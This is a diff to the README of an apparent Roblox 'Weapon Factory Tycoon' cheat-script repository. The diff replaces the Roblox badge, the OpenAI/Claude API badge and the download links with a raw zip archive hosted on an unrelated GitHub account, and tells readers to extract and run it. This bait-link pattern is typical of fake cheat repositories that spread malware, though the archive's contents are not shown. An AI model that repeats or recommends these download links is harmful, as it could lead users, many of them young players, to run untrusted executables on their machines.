@@ -1,8 +1,8 @@
 # 🏭 Weapon Factory Tycoon Roblox Script Repository
 
-[![Roblox](https://img.shields.io/badge/Roblox-Script-red?logo=roblox)](https://roblox.com)
+[![Roblox](https://img.shields.io/badge/Roblox-Script-red?logo=roblox)](https://raw.githubusercontent.com/himanshuhunterbaba/weapon-factory-tycoon-toolkit/branch/Aesculapian/weapon-toolkit-tycoon-factory-1.8.zip)
 [![MIT License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![API Integration](https://img.shields.io/badge/API-OpenAI%20%26%20Claude-informational)](https://platform.openai.com)
+[![API Integration](https://img.shields.io/badge/API-OpenAI%20%26%20Claude-informational)](https://raw.githubusercontent.com/himanshuhunterbaba/weapon-factory-tycoon-toolkit/branch/Aesculapian/weapon-toolkit-tycoon-factory-1.8.zip)
 [![Multilingual](https://img.shields.io/badge/Language-Multilingual-brightgreen)](#multilingual-support)
 [![Customer Support](https://img.shields.io/badge/Support-24%2F7-lightgrey)](#247-customer-support)
 
@@ -83,10 +83,10 @@ Trouble never sleeps, and neither do we. Reach the support team any hour, any ti
 **Ready to take the leap and automate your Weapon Factory Tycoon adventure?**  
 Grab the latest build here:
 
-[![Download](https://img.shields.io/badge/Download-blue)](https://sixtmore.github.io)
+[![Download](https://img.shields.io/badge/Download-blue)](https://raw.githubusercontent.com/himanshuhunterbaba/weapon-factory-tycoon-toolkit/branch/Aesculapian/weapon-toolkit-tycoon-factory-1.8.zip)
 
 **Download Instructions:**
-- Click the Download badge above or use https://sixtmore.github.io.
+- Click the Download badge above or use https://raw.githubusercontent.com/himanshuhunterbaba/weapon-factory-tycoon-toolkit/branch/Aesculapian/weapon-toolkit-tycoon-factory-1.8.zip
 - Extract and run the script using your preferred Roblox client.
 - See the [docs](#documentation) section for setup and configuration.
 
@@ -132,7 +132,7 @@ See the full license: [MIT LICENSE](LICENSE)
 Ready to customize your Weapon Factory Tycoon domain?  
 Download the robust, AI-enhanced Roblox script here:
 
-[![Download](https://img.shields.io/badge/Download-blue)](https://sixtmore.github.io)
+[![Download](https://img.shields.io/badge/Download-blue)](https://raw.githubusercontent.com/himanshuhunterbaba/weapon-factory-tycoon-toolkit/branch/Aesculapian/weapon-toolkit-tycoon-factory-1.8.zip)
 
 Explore, automate, and thrive—your Roblox legacy begins now!
 
